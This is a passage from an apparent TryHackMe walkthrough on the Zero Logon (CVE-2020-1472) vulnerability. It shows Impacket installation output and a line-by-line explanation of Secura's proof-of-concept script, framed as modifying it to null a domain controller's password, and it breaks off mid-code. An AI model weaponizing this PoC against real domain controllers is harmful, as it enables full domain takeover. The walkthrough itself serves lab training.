0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>After executing these commands, you should be placed within a Python3 Virtual Environment that will be compatible to modify the PoC to exploit Zero Logon.</p><p>Credit to Onurshin in the <a href="https://discord.com/invite/tryhackme" target="_blank" rel="noopener noreferrer">TryHackMe Discord</a> for suggesting Python Virtual Environments.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Zero Logon$ python3 -m pip install virtualenv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Defaulting to user installation because normal site-packages is not writeable</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting virtualenv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading virtualenv-20.1.0-py2.py3-none-any.whl (4.9 MB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 4.9 MB 2.6 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting filelock&lt;4,&gt;=3.0.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading filelock-3.0.12-py3-none-any.whl (7.6 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Requirement already satisfied: six&lt;2,&gt;=1.9.0 in /usr/lib/python3/dist-packages (from virtualenv) (1.14.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting distlib&lt;1,&gt;=0.3.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading distlib-0.3.1-py2.py3-none-any.whl (335 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 335 kB 11.6 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting appdirs&lt;2,&gt;=1.4.3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading appdirs-1.4.4-py2.py3-none-any.whl (9.6 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Installing collected packages: filelock, distlib, appdirs, virtualenv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Successfully installed appdirs-1.4.4 distlib-0.3.1 filelock-3.0.12 virtualenv-20.1.0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Zero Logon$ python3 -m virtualenv impacketEnv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">created virtual environment CPython3.8.2.final.0-64 in 2312ms</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  creator CPython3Posix(dest=/home/kali/CTFs/tryhackme/Zero Logon/impacketEnv, clear=False, global=False)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    added seed packages: pip==20.2.4, setuptools==50.3.2, wheel==0.35.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Zero Logon$ source impacketEnv/bin/activate</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$ pip install git+https://github.com/SecureAuthCorp/impacket</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting git+https://github.com/SecureAuthCorp/impacket</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Cloning https://github.com/SecureAuthCorp/impacket to /tmp/pip-req-build-8uoutbyk</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting pyasn1&gt;=0.2.3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Using cached pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting pycryptodomex</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading pycryptodomex-3.9.8-cp38-cp38-manylinux1_x86_64.whl (13.7 MB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 13.7 MB 10.2 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting pyOpenSSL&gt;=0.13.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading pyOpenSSL-19.1.0-py2.py3-none-any.whl (53 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 53 kB 2.6 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting six</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Using cached six-1.15.0-py2.py3-none-any.whl (10 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,&gt;=2.5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading ldap3-2.8.1-py2.py3-none-any.whl (423 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 423 kB 11.9 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting ldapdomaindump&gt;=0.9.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading ldapdomaindump-0.9.3-py3-none-any.whl (18 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting flask&gt;=1.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading Flask-1.1.2-py2.py3-none-any.whl (94 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 94 kB 2.7 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting cryptography&gt;=2.8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading cryptography-3.2.1-cp35-abi3-manylinux2010_x86_64.whl (2.6 MB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 2.6 MB 10.1 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting dnspython</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading dnspython-2.0.0-py3-none-any.whl (208 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 208 kB 5.9 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting future</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading future-0.18.2.tar.gz (829 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 829 kB 9.5 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting itsdangerous&gt;=0.24</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting click&gt;=5.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Using cached click-7.1.2-py2.py3-none-any.whl (82 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting Jinja2&gt;=2.10.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading Jinja2-2.11.2-py2.py3-none-any.whl (125 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 125 kB 11.0 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting Werkzeug&gt;=0.15</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 298 kB 8.6 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting cffi!=1.11.3,&gt;=1.8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading cffi-1.14.3-cp38-cp38-manylinux1_x86_64.whl (410 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     |████████████████████████████████| 410 kB 10.9 MB/s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting MarkupSafe&gt;=0.23</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Downloading MarkupSafe-1.1.1-cp38-cp38-manylinux1_x86_64.whl (32 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Collecting pycparser</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Using cached pycparser-2.20-py2.py3-none-any.whl (112 kB)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Building wheels for collected packages: impacket, future</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Building wheel for impacket (setup.py) ... done</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Created wheel for impacket: filename=impacket-0.9.22.dev1+20201015.130615.81eec85a-py3-none-any.whl size=1380825 sha256=4814945cbf35d81d3e80607e2914cee9750afeb4757293fdbfcc6c3d27d4a096</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Stored in directory: /tmp/pip-ephem-wheel-cache-yfasbqvb/wheels/f2/97/f5/f481ead2e27c873c98fbbcb0074319ce69f16008f64caea6fe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Building wheel for future (setup.py) ... done</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Created wheel for future: filename=future-0.18.2-py3-none-any.whl size=491059 sha256=f2a6c932900add817af8ec4134b22ed70d70f6166b8a109188e079e53986272b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Stored in directory: /home/kali/.cache/pip/wheels/8e/70/28/3d6ccd6e315f65f245da085482a2e1c7d14b90b30f239e2cf4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Successfully built impacket future</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Installing collected packages: pyasn1, pycryptodomex, six, pycparser, cffi, cryptography, pyOpenSSL, ldap3, dnspython, future, ldapdomaindump, itsdangerous, click, MarkupSafe, Jinja2, Werkzeug, flask, impacket</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Successfully installed Jinja2-2.11.2 MarkupSafe-1.1.1 Werkzeug-1.0.1 cffi-1.14.3 click-7.1.2 cryptography-3.2.1 dnspython-2.0.0 flask-1.1.2 future-0.18.2 impacket-0.9.22.dev1+20201015.130615.81eec85a itsdangerous-1.1.0 ldap3-2.8.1 ldapdomaindump-0.9.3 pyOpenSSL-19.1.0 pyasn1-0.4.8 pycparser-2.20 pycryptodomex-3.9.8 six-1.15.0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Install Impacket in a Virtual Environment</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-3-the-proof-of-concept">Task 3 The Proof of Concept<a href="#task-3-the-proof-of-concept" class="hash-link" aria-label="Direct link to Task 3 The Proof of Concept" title="Direct link to Task 3 The Proof of Concept">​</a></h2><p><strong>Modifying and Weaponizing the PoC</strong></p><p><strong>PoC and You -</strong></p><p>Poof of Concepts are incredibly important to every exploit, without them, the exploit&#x27;s are almost entirely theoretical. Fortunately, Secura was able to provide a working <a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank" rel="noopener noreferrer">Proof of Concept for Zero Logon</a> that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 2, Secura was even kind enough to give us the method that we need to call (<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81" target="_blank" rel="noopener noreferrer">NetrServerPasswordSet2</a>). Looking up the method within the Microsoft Documentation, it&#x27;s very similar to <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9" target="_blank" rel="noopener noreferrer">hNetSeverAuthenticate3</a>, so we&#x27;re going to re-use some of the same variables from that, as well as the structure.</p><p><strong>Analyzing the PoC -</strong></p><p>Before we continue any further, you should download the PoC from Secura, which can be found here:</p><p><a href="https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py</a></p><p>The script may seem quite daunting at first, but it&#x27;s quite simple, if you think back to Figure 1 from Task 2, you&#x27;ll quickly see how it all starts to fit together. Let&#x27;s start by breaking the PoC down. We&#x27;re going to be this in order of execution/importance so it&#x27;s easier to digest:</p><p><strong>Lines 3 - 13</strong></p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> impacket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dcerpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">v5 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> nrpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> epm</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> impacket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dcerpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">v5</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dtypes </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> NULL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> impacket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dcerpc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">v5 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> transport</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> impacket </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> crypto</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> hmac</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> hashlib</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> struct</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> binascii </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> hexlify</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> unhexlify</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> subprocess </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> check_call</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MAX_ATTEMPTS </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">2000</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we&#x27;re defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000.</p><p><strong>Lines 76 - 86</strong></p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> __name__ </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;__main__&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">3</span><span class="token plain"> </span><span class="token operator">&lt;=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">argv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&lt;=</span><span class="token plain"> </span><span class="token number">4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;\n&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Note: dc-name should be the (NetBIOS) computer name of the domain controller.&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">_</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dc_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dc_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> sys</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">argv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    dc_name </span><span class="token operator">=</span><span class="token plain"> dc_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">rstrip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;$&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    perform_attack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;\\\\&#x27;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> dc_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dc_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dc_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it&#x27;s exactly 3 (zerologon_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it&#x27;s greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc_name, and dc_ip. After the arguments are passed, dc_name is being stripped of the &quot;$&quot; character, as the dc_name variable shouldn&#x27;t have it. The user account name should however. Afterwards, it&#x27;s passing the variables two variables and an additional, modified variable into a module called &quot;perform_attack&quot;.</p><p><strong>Lines 57 - 73</strong></p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">perform_attack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dc_handle</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> dc_ip</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> target_computer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Performing authentication attempts...&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    rpc_con </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> attempt </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" 